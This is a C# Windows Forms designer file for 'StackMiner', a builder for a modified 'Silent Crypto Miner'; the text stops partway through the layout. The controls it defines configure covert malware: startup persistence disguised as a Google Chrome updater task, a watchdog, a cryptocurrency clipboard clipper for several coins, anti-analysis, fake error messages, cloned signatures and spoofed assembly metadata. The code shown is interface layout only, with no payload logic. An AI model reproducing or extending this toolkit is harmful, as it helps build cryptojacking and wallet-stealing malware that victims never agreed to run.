using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace StackMiner
{
    [DesignerGenerated()]
    public partial class Builder : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components = null;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Builder));
            this.workerBuild = new System.ComponentModel.BackgroundWorker();
            this.formBuilder = new MephTheme();
            this.txtSignatureData = new MephTextBox();
            this.tabcontrolBuilder = new MephTabcontrol();
            this.tabMain = new System.Windows.Forms.TabPage();
            this.labelLang = new System.Windows.Forms.Label();
            this.comboLanguage = new MephComboBox();
            this.btnLoadState = new MephButton();
            this.btnSaveState = new MephButton();
            this.listMiners = new MephListBox();
            this.btnMinerRemove = new MephButton();
            this.btnMinerEdit = new MephButton();
            this.btnMinerAdd = new MephButton();
            this.labelMiners = new System.Windows.Forms.Label();
            this.labelWiki = new System.Windows.Forms.LinkLabel();
            this.labelHelp = new System.Windows.Forms.Label();
            this.tabStartup = new System.Windows.Forms.TabPage();
            this.labelAdvancedOptionRunInstall = new System.Windows.Forms.Label();
            this.toggleRunInstall = new MephToggleSwitch();
            this.btnStartupEntryNameRandomize = new MephButton();
            this.btnStartupFileNameRandomize = new MephButton();
            this.txtStartupFileName = new MephTextBox();
            this.labelStartupFileName = new System.Windows.Forms.Label();
            this.labelStartupAutoDelete = new System.Windows.Forms.Label();
            this.toggleAutoDelete = new MephToggleSwitch();
            this.labelStartupWatchdog = new System.Windows.Forms.Label();
            this.toggleWatchdog = new MephToggleSwitch();
            this.chkStartup = new MephCheckBox();
            this.txtStartupEntryName = new MephTextBox();
            this.labelStartupSavePath = new System.Windows.Forms.Label();
            this.labelStartupEntryName = new System.Windows.Forms.Label();
            this.txtStartupPath = new MephComboBox();
            this.tabAssembly = new System.Windows.Forms.TabPage();
            this.labelAssemblyVersion = new System.Windows.Forms.Label();
            this.chkAssembly = new MephCheckBox();
            this.btnAssemblyRandom = new MephButton();
            this.txtAssemblyTitle = new MephTextBox();
            this.btnAssemblyClone = new MephButton();
            this.txtAssemblyProduct = new MephTextBox();
            this.txtAssemblyVersion4 = new MephTextBox();
            this.txtAssemblyDescription = new MephTextBox();
            this.txtAssemblyVersion3 = new MephTextBox();
            this.txtAssemblyCopyright = new MephTextBox();
            this.txtAssemblyVersion2 = new MephTextBox();
            this.txtAssemblyCompany = new MephTextBox();
            this.txtAssemblyVersion1 = new MephTextBox();
            this.txtAssemblyTrademark = new MephTextBox();
            this.tabClipper = new System.Windows.Forms.TabPage();
            this.chkClipperXLM = new MephToggleSwitch();
            this.chkClipperDASH = new MephToggleSwitch();
            this.chkClipperDOGE = new MephToggleSwitch();
            this.chkClipperBCH = new MephToggleSwitch();
            this.chkClipperXMR = new MephToggleSwitch();
            this.chkClipperLTC = new MephToggleSwitch();
            this.chkClipperETH = new MephToggleSwitch();
            this.chkClipperBTC = new MephToggleSwitch();
            this.txtClipperXMR = new MephTextBox();
            this.txtClipperXLM = new MephTextBox();
            this.chkClipper = new MephCheckBox();
            this.txtClipperBTC = new MephTextBox();
            this.txtClipperBCH = new MephTextBox();
            this.txtClipperETH = new MephTextBox();
            this.txtClipperDOGE = new MephTextBox();
            this.txtClipperLTC = new MephTextBox();
            this.txtClipperDASH = new MephTextBox();
            this.tabOptions = new System.Windows.Forms.TabPage();
            this.labelAntiAnalysis = new System.Windows.Forms.Label();
            this.chkAntiAnalysis = new MephToggleSwitch();
            this.txtPumpSize = new MephTextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.chkIcon = new MephCheckBox();
            this.picIcon = new System.Windows.Forms.PictureBox();
            this.btnIconBrowse = new MephButton();
            this.txtIconPath = new MephTextBox();
            this.btnAdvancedOptions = new MephButton();
            this.labelDisableSleep = new System.Windows.Forms.Label();
            this.toggleDisableSleep = new MephToggleSwitch();
            this.labelOptionAdministrator = new System.Windows.Forms.Label();
            this.toggleAdministrator = new MephToggleSwitch();
            this.tabExtra = new System.Windows.Forms.TabPage();
            this.txtFakeErrorTitle = new MephTextBox();
            this.btnSignatureBrowse = new MephButton();
            this.txtSignaturePath = new MephTextBox();
            this.chkSignature = new MephCheckBox();
            this.txtFakeErrorText = new MephTextBox();
            this.chkFakeError = new MephCheckBox();
            this.chkAntiUsername = new MephCheckBox();
            this.txtAntiUsername = new MephTextBox();
            this.tabBuild = new System.Windows.Forms.TabPage();
            this.linkTelegram = new System.Windows.Forms.LinkLabel();
            this.linkStackGithub = new System.Windows.Forms.LinkLabel();
            this.labelSeconds = new System.Windows.Forms.Label();
            this.labelGitHub = new System.Windows.Forms.LinkLabel();
            this.labelStartDelay = new System.Windows.Forms.Label();
            this.txtStartDelay = new MephTextBox();
            this.txtLog = new MephTextBox();
            this.btnBuild = new MephButton();
            this.formBuilder.SuspendLayout();
            this.tabcontrolBuilder.SuspendLayout();
            this.tabMain.SuspendLayout();
            this.tabStartup.SuspendLayout();
            this.tabAssembly.SuspendLayout();
            this.tabClipper.SuspendLayout();
            this.tabOptions.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picIcon)).BeginInit();
            this.tabExtra.SuspendLayout();
            this.tabBuild.SuspendLayout();
            this.SuspendLayout();
            // 
            // workerBuild
            // 
            this.workerBuild.DoWork += new System.ComponentModel.DoWorkEventHandler(this.workerBuild_DoWork);
            this.workerBuild.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.workerBuild_RunWorkerCompleted);
            // 
            // formBuilder
            // 
            this.formBuilder.AccentColor = System.Drawing.Color.Transparent;
            this.formBuilder.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formBuilder.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formBuilder.Controls.Add(this.txtSignatureData);
            this.formBuilder.Controls.Add(this.tabcontrolBuilder);
            this.formBuilder.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.formBuilder.ForeColor = System.Drawing.Color.Gray;
            this.formBuilder.Location = new System.Drawing.Point(0, 0);
            this.formBuilder.Margin = new System.Windows.Forms.Padding(2);
            this.formBuilder.MaximumSize = new System.Drawing.Size(535, 272);
            this.formBuilder.MinimumSize = new System.Drawing.Size(535, 272);
            this.formBuilder.Name = "formBuilder";
            this.formBuilder.Size = new System.Drawing.Size(535, 272);
            this.formBuilder.SubHeader = "Modified: Silent Crypto Miner (Unam Sanctam)";
            this.formBuilder.TabIndex = 0;
            this.formBuilder.Text = "Stack\'s Miner (github.com/stackrose)";
            // 
            // txtSignatureData
            // 
            this.txtSignatureData.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtSignatureData.ForeColor = System.Drawing.Color.Silver;
            this.txtSignatureData.Location = new System.Drawing.Point(286, 287);
            this.txtSignatureData.Margin = new System.Windows.Forms.Padding(2);
            this.txtSignatureData.MaxLength = 32767;
            this.txtSignatureData.MultiLine = true;
            this.txtSignatureData.Name = "txtSignatureData";
            this.txtSignatureData.ReadOnly = true;
            this.txtSignatureData.Size = new System.Drawing.Size(109, 24);
            this.txtSignatureData.TabIndex = 160;
            this.txtSignatureData.Text = "Signature Data";
            this.txtSignatureData.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtSignatureData.UseSystemPasswordChar = false;
            this.txtSignatureData.Visible = false;
            this.txtSignatureData.WordWrap = false;
            // 
            // tabcontrolBuilder
            // 
            this.tabcontrolBuilder.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.tabcontrolBuilder.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.tabcontrolBuilder.Controls.Add(this.tabMain);
            this.tabcontrolBuilder.Controls.Add(this.tabStartup);
            this.tabcontrolBuilder.Controls.Add(this.tabAssembly);
            this.tabcontrolBuilder.Controls.Add(this.tabClipper);
            this.tabcontrolBuilder.Controls.Add(this.tabOptions);
            this.tabcontrolBuilder.Controls.Add(this.tabExtra);
            this.tabcontrolBuilder.Controls.Add(this.tabBuild);
            this.tabcontrolBuilder.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.tabcontrolBuilder.ItemSize = new System.Drawing.Size(27, 85);
            this.tabcontrolBuilder.Location = new System.Drawing.Point(13, 65);
            this.tabcontrolBuilder.Margin = new System.Windows.Forms.Padding(0);
            this.tabcontrolBuilder.Multiline = true;
            this.tabcontrolBuilder.Name = "tabcontrolBuilder";
            this.tabcontrolBuilder.Padding = new System.Drawing.Point(0, 0);
            this.tabcontrolBuilder.SelectedIndex = 0;
            this.tabcontrolBuilder.Size = new System.Drawing.Size(511, 198);
            this.tabcontrolBuilder.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabcontrolBuilder.TabIndex = 17;
            // 
            // tabMain
            // 
            this.tabMain.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabMain.Controls.Add(this.labelLang);
            this.tabMain.Controls.Add(this.comboLanguage);
            this.tabMain.Controls.Add(this.btnLoadState);
            this.tabMain.Controls.Add(this.btnSaveState);
            this.tabMain.Controls.Add(this.listMiners);
            this.tabMain.Controls.Add(this.btnMinerRemove);
            this.tabMain.Controls.Add(this.btnMinerEdit);
            this.tabMain.Controls.Add(this.btnMinerAdd);
            this.tabMain.Controls.Add(this.labelMiners);
            this.tabMain.Controls.Add(this.labelWiki);
            this.tabMain.Controls.Add(this.labelHelp);
            this.tabMain.Location = new System.Drawing.Point(89, 4);
            this.tabMain.Margin = new System.Windows.Forms.Padding(0);
            this.tabMain.Name = "tabMain";
            this.tabMain.Size = new System.Drawing.Size(418, 190);
            this.tabMain.TabIndex = 0;
            this.tabMain.Text = "Main";
            // 
            // labelLang
            // 
            this.labelLang.AutoEllipsis = true;
            this.labelLang.BackColor = System.Drawing.Color.Transparent;
            this.labelLang.Location = new System.Drawing.Point(15, 160);
            this.labelLang.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelLang.Name = "labelLang";
            this.labelLang.Size = new System.Drawing.Size(68, 17);
            this.labelLang.TabIndex = 51;
            this.labelLang.Text = "Language:";
            // 
            // comboLanguage
            // 
            this.comboLanguage.BackColor = System.Drawing.Color.Transparent;
            this.comboLanguage.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboLanguage.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboLanguage.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboLanguage.ForeColor = System.Drawing.Color.Silver;
            this.comboLanguage.FormattingEnabled = true;
            this.comboLanguage.ItemHeight = 16;
            this.comboLanguage.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboLanguage.Items.AddRange(new object[] {
            "English",
            "Swedish",
            "Polish",
            "Spanish",
            "Russian",
            "Portuguese (Brazil)"});
            this.comboLanguage.Location = new System.Drawing.Point(83, 158);
            this.comboLanguage.Margin = new System.Windows.Forms.Padding(2);
            this.comboLanguage.Name = "comboLanguage";
            this.comboLanguage.Size = new System.Drawing.Size(140, 22);
            this.comboLanguage.StartIndex = 0;
            this.comboLanguage.TabIndex = 50;
            this.comboLanguage.SelectedIndexChanged += new System.EventHandler(this.comboLanguage_SelectedIndexChanged);
            // 
            // btnLoadState
            // 
            this.btnLoadState.BackColor = System.Drawing.Color.Transparent;
            this.btnLoadState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnLoadState.Location = new System.Drawing.Point(354, 158);
            this.btnLoadState.Name = "btnLoadState";
            this.btnLoadState.Size = new System.Drawing.Size(53, 22);
            this.btnLoadState.TabIndex = 49;
            this.btnLoadState.Text = "Load";
            this.btnLoadState.Click += new System.EventHandler(this.btnLoadState_Click);
            // 
            // btnSaveState
            // 
            this.btnSaveState.BackColor = System.Drawing.Color.Transparent;
            this.btnSaveState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnSaveState.Location = new System.Drawing.Point(295, 158);
            this.btnSaveState.Name = "btnSaveState";
            this.btnSaveState.Size = new System.Drawing.Size(53, 22);
            this.btnSaveState.TabIndex = 48;
            this.btnSaveState.Text = "Save";
            this.btnSaveState.Click += new System.EventHandler(this.btnSaveState_Click);
            // 
            // listMiners
            // 
            this.listMiners.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.listMiners.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listMiners.ForeColor = System.Drawing.Color.Silver;
            this.listMiners.ItemHeight = 17;
            this.listMiners.Location = new System.Drawing.Point(15, 31);
            this.listMiners.Name = "listMiners";
            this.listMiners.Size = new System.Drawing.Size(392, 64);
            this.listMiners.TabIndex = 47;
            // 
            // btnMinerRemove
            // 
            this.btnMinerRemove.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerRemove.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerRemove.Location = new System.Drawing.Point(173, 101);
            this.btnMinerRemove.Name = "btnMinerRemove";
            this.btnMinerRemove.Size = new System.Drawing.Size(73, 23);
            this.btnMinerRemove.TabIndex = 46;
            this.btnMinerRemove.Text = "Remove";
            this.btnMinerRemove.Click += new System.EventHandler(this.btnMinerRemove_Click);
            // 
            // btnMinerEdit
            // 
            this.btnMinerEdit.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerEdit.Location = new System.Drawing.Point(94, 101);
            this.btnMinerEdit.Name = "btnMinerEdit";
            this.btnMinerEdit.Size = new System.Drawing.Size(73, 23);
            this.btnMinerEdit.TabIndex = 45;
            this.btnMinerEdit.Text = "Edit";
            this.btnMinerEdit.Click += new System.EventHandler(this.btnMinerEdit_Click);
            // 
            // btnMinerAdd
            // 
            this.btnMinerAdd.BackColor = System.Drawing.Color.Transparent;
            this.btnMinerAdd.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnMinerAdd.Location = new System.Drawing.Point(15, 101);
            this.btnMinerAdd.Name = "btnMinerAdd";
            this.btnMinerAdd.Size = new System.Drawing.Size(73, 23);
            this.btnMinerAdd.TabIndex = 44;
            this.btnMinerAdd.Text = "Add";
            this.btnMinerAdd.Click += new System.EventHandler(this.btnMinerAdd_Click);
            // 
            // labelMiners
            // 
            this.labelMiners.AutoSize = true;
            this.labelMiners.BackColor = System.Drawing.Color.Transparent;
            this.labelMiners.Location = new System.Drawing.Point(12, 11);
            this.labelMiners.Name = "labelMiners";
            this.labelMiners.Size = new System.Drawing.Size(48, 17);
            this.labelMiners.TabIndex = 42;
            this.labelMiners.Text = "Miners";
            // 
            // labelWiki
            // 
            this.labelWiki.AutoSize = true;
            this.labelWiki.BackColor = System.Drawing.Color.Transparent;
            this.labelWiki.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(198)))), ((int)(((byte)(198)))), ((int)(((byte)(198)))));
            this.labelWiki.Location = new System.Drawing.Point(378, 8);
            this.labelWiki.Name = "labelWiki";
            this.labelWiki.Size = new System.Drawing.Size(29, 17);
            this.labelWiki.TabIndex = 40;
            this.labelWiki.TabStop = true;
            this.labelWiki.Text = "wiki";
            this.labelWiki.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelWiki_LinkClicked);
            // 
            // labelHelp
            // 
            this.labelHelp.BackColor = System.Drawing.Color.Transparent;
            this.labelHelp.Location = new System.Drawing.Point(176, 8);
            this.labelHelp.Name = "labelHelp";
            this.labelHelp.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.labelHelp.Size = new System.Drawing.Size(210, 17);
            this.labelHelp.TabIndex = 41;
            this.labelHelp.Text = "For help please check the ";
            this.labelHelp.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            // 
            // tabStartup
            // 
            this.tabStartup.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabStartup.Controls.Add(this.labelAdvancedOptionRunInstall);
            this.tabStartup.Controls.Add(this.toggleRunInstall);
            this.tabStartup.Controls.Add(this.btnStartupEntryNameRandomize);
            this.tabStartup.Controls.Add(this.btnStartupFileNameRandomize);
            this.tabStartup.Controls.Add(this.txtStartupFileName);
            this.tabStartup.Controls.Add(this.labelStartupFileName);
            this.tabStartup.Controls.Add(this.labelStartupAutoDelete);
            this.tabStartup.Controls.Add(this.toggleAutoDelete);
            this.tabStartup.Controls.Add(this.labelStartupWatchdog);
            this.tabStartup.Controls.Add(this.toggleWatchdog);
            this.tabStartup.Controls.Add(this.chkStartup);
            this.tabStartup.Controls.Add(this.txtStartupEntryName);
            this.tabStartup.Controls.Add(this.labelStartupSavePath);
            this.tabStartup.Controls.Add(this.labelStartupEntryName);
            this.tabStartup.Controls.Add(this.txtStartupPath);
            this.tabStartup.Location = new System.Drawing.Point(89, 4);
            this.tabStartup.Margin = new System.Windows.Forms.Padding(0);
            this.tabStartup.Name = "tabStartup";
            this.tabStartup.Size = new System.Drawing.Size(418, 190);
            this.tabStartup.TabIndex = 1;
            this.tabStartup.Text = "Startup";
            // 
            // labelAdvancedOptionRunInstall
            // 
            this.labelAdvancedOptionRunInstall.AutoEllipsis = true;
            this.labelAdvancedOptionRunInstall.BackColor = System.Drawing.Color.Transparent;
            this.labelAdvancedOptionRunInstall.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelAdvancedOptionRunInstall.ForeColor = System.Drawing.Color.Gray;
            this.labelAdvancedOptionRunInstall.Location = new System.Drawing.Point(157, 161);
            this.labelAdvancedOptionRunInstall.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelAdvancedOptionRunInstall.Name = "labelAdvancedOptionRunInstall";
            this.labelAdvancedOptionRunInstall.Size = new System.Drawing.Size(139, 17);
            this.labelAdvancedOptionRunInstall.TabIndex = 156;
            this.labelAdvancedOptionRunInstall.Text = "Run miner after install";
            // 
            // toggleRunInstall
            // 
            this.toggleRunInstall.BackColor = System.Drawing.Color.Transparent;
            this.toggleRunInstall.Checked = true;
            this.toggleRunInstall.Enabled = false;
            this.toggleRunInstall.ForeColor = System.Drawing.Color.Black;
            this.toggleRunInstall.Location = new System.Drawing.Point(300, 159);
            this.toggleRunInstall.Margin = new System.Windows.Forms.Padding(2);
            this.toggleRunInstall.Name = "toggleRunInstall";
            this.toggleRunInstall.Size = new System.Drawing.Size(50, 24);
            this.toggleRunInstall.TabIndex = 155;
            // 
            // btnStartupEntryNameRandomize
            // 
            this.btnStartupEntryNameRandomize.BackColor = System.Drawing.Color.Transparent;
            this.btnStartupEntryNameRandomize.Enabled = false;
            this.btnStartupEntryNameRandomize.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnStartupEntryNameRandomize.Location = new System.Drawing.Point(324, 73);
            this.btnStartupEntryNameRandomize.Margin = new System.Windows.Forms.Padding(2);
            this.btnStartupEntryNameRandomize.Name = "btnStartupEntryNameRandomize";
            this.btnStartupEntryNameRandomize.Size = new System.Drawing.Size(82, 24);
            this.btnStartupEntryNameRandomize.TabIndex = 51;
            this.btnStartupEntryNameRandomize.Text = "Randomize";
            this.btnStartupEntryNameRandomize.Click += new System.EventHandler(this.btnStartupEntryNameRandomize_Click);
            // 
            // btnStartupFileNameRandomize
            // 
            this.btnStartupFileNameRandomize.BackColor = System.Drawing.Color.Transparent;
            this.btnStartupFileNameRandomize.Enabled = false;
            this.btnStartupFileNameRandomize.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnStartupFileNameRandomize.Location = new System.Drawing.Point(324, 102);
            this.btnStartupFileNameRandomize.Margin = new System.Windows.Forms.Padding(2);
            this.btnStartupFileNameRandomize.Name = "btnStartupFileNameRandomize";
            this.btnStartupFileNameRandomize.Size = new System.Drawing.Size(82, 24);
            this.btnStartupFileNameRandomize.TabIndex = 50;
            this.btnStartupFileNameRandomize.Text = "Randomize";
            this.btnStartupFileNameRandomize.Click += new System.EventHandler(this.btnStartupFileNameRandomize_Click);
            // 
            // txtStartupFileName
            // 
            this.txtStartupFileName.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStartupFileName.Enabled = false;
            this.txtStartupFileName.ForeColor = System.Drawing.Color.Silver;
            this.txtStartupFileName.Location = new System.Drawing.Point(95, 102);
            this.txtStartupFileName.Margin = new System.Windows.Forms.Padding(2);
            this.txtStartupFileName.MaxLength = 32767;
            this.txtStartupFileName.MultiLine = false;
            this.txtStartupFileName.Name = "txtStartupFileName";
            this.txtStartupFileName.ReadOnly = false;
            this.txtStartupFileName.Size = new System.Drawing.Size(224, 24);
            this.txtStartupFileName.TabIndex = 48;
            this.txtStartupFileName.Text = "Google\\Chrome\\updater.exe";
            this.txtStartupFileName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStartupFileName.UseSystemPasswordChar = false;
            this.txtStartupFileName.WordWrap = false;
            // 
            // labelStartupFileName
            // 
            this.labelStartupFileName.AutoEllipsis = true;
            this.labelStartupFileName.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupFileName.Location = new System.Drawing.Point(11, 104);
            this.labelStartupFileName.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupFileName.Name = "labelStartupFileName";
            this.labelStartupFileName.Size = new System.Drawing.Size(80, 17);
            this.labelStartupFileName.TabIndex = 49;
            this.labelStartupFileName.Text = "File Name";
            // 
            // labelStartupAutoDelete
            // 
            this.labelStartupAutoDelete.AutoEllipsis = true;
            this.labelStartupAutoDelete.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupAutoDelete.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartupAutoDelete.Location = new System.Drawing.Point(12, 161);
            this.labelStartupAutoDelete.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupAutoDelete.Name = "labelStartupAutoDelete";
            this.labelStartupAutoDelete.Size = new System.Drawing.Size(80, 17);
            this.labelStartupAutoDelete.TabIndex = 47;
            this.labelStartupAutoDelete.Text = "Auto-delete";
            // 
            // toggleAutoDelete
            // 
            this.toggleAutoDelete.BackColor = System.Drawing.Color.Transparent;
            this.toggleAutoDelete.Checked = false;
            this.toggleAutoDelete.Enabled = false;
            this.toggleAutoDelete.ForeColor = System.Drawing.Color.Black;
            this.toggleAutoDelete.Location = new System.Drawing.Point(95, 159);
            this.toggleAutoDelete.Margin = new System.Windows.Forms.Padding(2);
            this.toggleAutoDelete.Name = "toggleAutoDelete";
            this.toggleAutoDelete.Size = new System.Drawing.Size(50, 24);
            this.toggleAutoDelete.TabIndex = 46;
            // 
            // labelStartupWatchdog
            // 
            this.labelStartupWatchdog.AutoEllipsis = true;
            this.labelStartupWatchdog.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupWatchdog.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartupWatchdog.Location = new System.Drawing.Point(12, 132);
            this.labelStartupWatchdog.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupWatchdog.Name = "labelStartupWatchdog";
            this.labelStartupWatchdog.Size = new System.Drawing.Size(80, 17);
            this.labelStartupWatchdog.TabIndex = 45;
            this.labelStartupWatchdog.Text = "Watchdog";
            // 
            // toggleWatchdog
            // 
            this.toggleWatchdog.BackColor = System.Drawing.Color.Transparent;
            this.toggleWatchdog.Checked = true;
            this.toggleWatchdog.Enabled = false;
            this.toggleWatchdog.ForeColor = System.Drawing.Color.Black;
            this.toggleWatchdog.Location = new System.Drawing.Point(95, 130);
            this.toggleWatchdog.Margin = new System.Windows.Forms.Padding(2);
            this.toggleWatchdog.Name = "toggleWatchdog";
            this.toggleWatchdog.Size = new System.Drawing.Size(50, 24);
            this.toggleWatchdog.TabIndex = 44;
            // 
            // chkStartup
            // 
            this.chkStartup.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkStartup.BackColor = System.Drawing.Color.Transparent;
            this.chkStartup.Checked = false;
            this.chkStartup.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkStartup.ForeColor = System.Drawing.Color.Black;
            this.chkStartup.Location = new System.Drawing.Point(14, 12);
            this.chkStartup.Margin = new System.Windows.Forms.Padding(2);
            this.chkStartup.Name = "chkStartup";
            this.chkStartup.Size = new System.Drawing.Size(111, 24);
            this.chkStartup.TabIndex = 21;
            this.chkStartup.Text = "Disabled";
            this.chkStartup.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkStartup_CheckedChanged);
            // 
            // txtStartupEntryName
            // 
            this.txtStartupEntryName.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStartupEntryName.Enabled = false;
            this.txtStartupEntryName.ForeColor = System.Drawing.Color.Silver;
            this.txtStartupEntryName.Location = new System.Drawing.Point(95, 73);
            this.txtStartupEntryName.Margin = new System.Windows.Forms.Padding(2);
            this.txtStartupEntryName.MaxLength = 32767;
            this.txtStartupEntryName.MultiLine = false;
            this.txtStartupEntryName.Name = "txtStartupEntryName";
            this.txtStartupEntryName.ReadOnly = false;
            this.txtStartupEntryName.Size = new System.Drawing.Size(224, 24);
            this.txtStartupEntryName.TabIndex = 8;
            this.txtStartupEntryName.Text = "GoogleUpdateTaskMachineQC";
            this.txtStartupEntryName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStartupEntryName.UseSystemPasswordChar = false;
            this.txtStartupEntryName.WordWrap = false;
            // 
            // labelStartupSavePath
            // 
            this.labelStartupSavePath.AutoEllipsis = true;
            this.labelStartupSavePath.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupSavePath.Location = new System.Drawing.Point(11, 46);
            this.labelStartupSavePath.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupSavePath.Name = "labelStartupSavePath";
            this.labelStartupSavePath.Size = new System.Drawing.Size(80, 17);
            this.labelStartupSavePath.TabIndex = 19;
            this.labelStartupSavePath.Text = "Save Path";
            // 
            // labelStartupEntryName
            // 
            this.labelStartupEntryName.AutoEllipsis = true;
            this.labelStartupEntryName.BackColor = System.Drawing.Color.Transparent;
            this.labelStartupEntryName.Location = new System.Drawing.Point(11, 75);
            this.labelStartupEntryName.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartupEntryName.Name = "labelStartupEntryName";
            this.labelStartupEntryName.Size = new System.Drawing.Size(80, 17);
            this.labelStartupEntryName.TabIndex = 9;
            this.labelStartupEntryName.Text = "Entry Name";
            // 
            // txtStartupPath
            // 
            this.txtStartupPath.BackColor = System.Drawing.Color.Transparent;
            this.txtStartupPath.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.txtStartupPath.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.txtStartupPath.Enabled = false;
            this.txtStartupPath.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.txtStartupPath.ForeColor = System.Drawing.Color.Silver;
            this.txtStartupPath.FormattingEnabled = true;
            this.txtStartupPath.ItemHeight = 16;
            this.txtStartupPath.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.txtStartupPath.Items.AddRange(new object[] {
            "AppData",
            "UserProfile"});
            this.txtStartupPath.Location = new System.Drawing.Point(95, 45);
            this.txtStartupPath.Margin = new System.Windows.Forms.Padding(2);
            this.txtStartupPath.Name = "txtStartupPath";
            this.txtStartupPath.Size = new System.Drawing.Size(139, 22);
            this.txtStartupPath.StartIndex = 0;
            this.txtStartupPath.TabIndex = 18;
            // 
            // tabAssembly
            // 
            this.tabAssembly.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabAssembly.Controls.Add(this.labelAssemblyVersion);
            this.tabAssembly.Controls.Add(this.chkAssembly);
            this.tabAssembly.Controls.Add(this.btnAssemblyRandom);
            this.tabAssembly.Controls.Add(this.txtAssemblyTitle);
            this.tabAssembly.Controls.Add(this.btnAssemblyClone);
            this.tabAssembly.Controls.Add(this.txtAssemblyProduct);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion4);
            this.tabAssembly.Controls.Add(this.txtAssemblyDescription);
            this.tabAssembly.Controls.Add(this.txtAssemblyVersion3);
            this.tabAssembly.Controls.Add(this.txtAssemblyCopyright);
